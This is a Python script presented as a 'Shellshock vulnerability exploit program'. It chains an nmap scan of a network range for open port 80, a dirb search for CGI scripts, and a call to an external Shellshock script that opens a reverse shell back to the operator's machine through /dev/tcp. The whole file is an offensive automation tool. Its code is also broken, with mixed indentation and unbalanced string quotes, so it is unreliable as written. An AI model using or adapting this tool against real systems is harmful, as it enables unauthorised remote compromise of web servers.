import sys
import os
import subprocess
import re 

def nmap_scanner(data):
            
    print("  __   ____       __    ____    ______  ______   _     __   __  __    ")
    print("/'__`\/\  _`\   /'__`\ /\  _`\ /\  _  \/\__  _\/' \  /'__`\/\ \/\ \ ")
    print("/\ \/\ \ \ \L\ \/\_\L\ \\ \ \L\ \ \ \L\ \/_/\ \/\_, \/\ \/\ \ \ `\\ \ ")    
    print("\ \ \ \ \ \ ,__/\/_/_\_<_\ \ ,  /\ \  __ \ \ \ \/_/\ \ \ \ \ \ \ , ` \  ")
    print(" \ \ \_\ \ \ \/   /\ \L\ \\ \ \\ \\ \ \/\ \ \ \ \ \ \ \ \ \_\ \ \ \`\ \" )
    print("  \ \____/\ \_\   \ \____/ \ \_\ \_\ \_\ \_\ \ \_\ \ \_\ \____/\ \_\ \_\" )
    print("   \/___/  \/_/    \/___/   \/_/\/ /\/_/\/_/  \/_/  \/_/\/___/  \/_/\/_/")
    print("                    __    __  __     __       _     _    __    __  __     __   ____     __  __ ")
    print("                   /\ \_ /\ \/\ \  /'__`\   /' \  /' \  /\ \_ /\ \/\ \  /'__`\/\  _`\  /\ \/\ \ ")
    print("                   \/'__`\ \ \_\ \/\_\L\ \ /\_, \/\_, \ \/'__`\ \ \_\ \/\ \/\ \ \ \/\_\\ \ \/'/' ")
    print("                   /\ \_\_\ \  _  \/_/_\_<_\/_/\ \/_/\ \/\ \_\_\ \  _  \ \ \ \ \ \ \/_/_\ \ , < ")
    print("                   \ \____ \ \ \ \ \/\ \L\ \  \ \ \ \ \ \ \____ \ \ \ \ \ \ \_\ \ \ \L\ \\ \ \\`\ ")
    print("                    \/\ \_\ \ \_\ \_\ \____/   \ \_\ \ \_\/\ \_\ \ \_\ \_\ \____/\ \____/ \ \_\ \_\")
    print("                     \ `\_ _/\/_/\/_/\/___/     \/_/  \/_/\ `\_ _/\/_/\/_/\/___/  \/___/   \/_/\/_/")
	print("                      `\_/\_\                              `\_/\_\                                 ")
    print("                         \/_/                                 \/_/                                 ")
    print("$he11$h0ck Vu1ner@bi1ity 3xPlo1t Pr0gRAm")

     cont_var = raw_input('Press "Enter" key to continue...')
        
	print("please type out IP Network address with CIDR notation")
	print("For Example: 192.168.0.0/24")
        ip_address = raw_input("")
        nmap_command = 'nmap -p 80 '+ip_address+' -open | awk '+"'/Nmap scan/{gsub(/[()]/,"+'""'+",$NF); print $NF}'"
	nmap_ip_address = os.system(nmap_command)
        output = subprocess.check_output(nmap_command, shell=True)
        ip_output = output.rstrip()
        
        regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$'''        
        if (re.search(regex, ip_output)):
            print('valid ip address' )
            print(ip_output)
            pass
        else: 
            print('No host with port 80 open found!')
            sys.exit()
        dirb = 'dirb http://' + ip_output + "/cgi-bin | grep 'CODE:200' | awk 'gsub(/.*bin|\ \(CODE.*/,\"\")'" 
        
        dirb_result = os.system(dirb)
        dirb_final = subprocess.check_output(dirb,shell=True)
        dirb_file = dirb_final.rstrip()
        print(dirb_final)
        host_ip_address = " /sbin/ifconfig eth0 | grep -i mask | awk '{print $2}'| cut -f2 -d:"
        store_host_ip = subprocess.check_output(host_ip_address,shell=True)
        stored_host_ip = store_host_ip.rstrip()
        print('Which port on your machine do you want reverse shell opened on?')
        print('For Example: 1337')
        port = raw_input('')
        shellshock_command = 'python shellshock_script.py -t ' + str(ip_output) + ' -u /cgi-bin' + str(dirb_file) + ' -r '+ str(stored_host_ip) + ' -p ' + port + ' -s dev_tcp'
        print(shellshock_command)
        shellshock_running = os.system(shellshock_command)





def main():
    nmap_scanner(input)

if __name__ == '__main__':
    main()

